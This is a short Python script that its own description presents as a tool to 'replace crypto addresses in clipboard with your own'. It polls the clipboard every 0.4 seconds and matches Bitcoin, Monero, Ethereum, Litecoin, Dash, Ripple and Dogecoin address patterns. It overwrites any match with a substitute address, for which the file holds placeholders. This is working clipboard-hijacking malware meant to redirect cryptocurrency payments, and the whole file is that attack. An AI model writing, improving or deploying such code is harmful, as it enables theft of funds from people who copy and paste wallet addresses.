import pyperclip
import re
import argparse
import json
import time
import sys

parser = argparse.ArgumentParser(
    description="Replace crypto addresses in clipboard with your own"
)
parser.add_argument("--verbose", help="Get more details", action="store_true")
# parser.add_argument("--log", help="Log actions to log.txt", action="store_true")
args = parser.parse_args()


def parse_clip(clipboard):
    cryptos = {
        "legacy_btc": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "segwit_btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "ripple": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
    }
    if len(clipboard) >= 100:
        if args.verbose:
            print("Clipboard is too long... doing nothing")
        return False

    for k, v in cryptos.items():
        if bool(re.search(v, clipboard)):
            if args.verbose:
                print(f"Found {k}")
            return k
    return False


def replace_clip(clipboard, crypto):
    my_addresses = {
        "legacy_btc": "leg_ad",
        "segwit_btc": "seg_ad",
        "xmr": "xmr_ad",
        "eth": "eth_ad",
        "lite": "lite_ad",
        "dash": "dash_ad",
        "ripple": "ripple_ad",
        "doge": "doge_ad",
    }
    clipboard = my_addresses[crypto]
    return clipboard


def main():
    current_clipboard = pyperclip.paste()
    crypto_found = parse_clip(current_clipboard)
    if crypto_found != False:
        # if there is a crypto found replace else return original
        replacement = replace_clip(current_clipboard, crypto_found)
        if args.verbose:
            print(f"{pyperclip.paste()} -> {replacement}")
        pyperclip.copy(replacement)
    else:
        pyperclip.copy(current_clipboard)


while True:
    time.sleep(0.4)
    main()
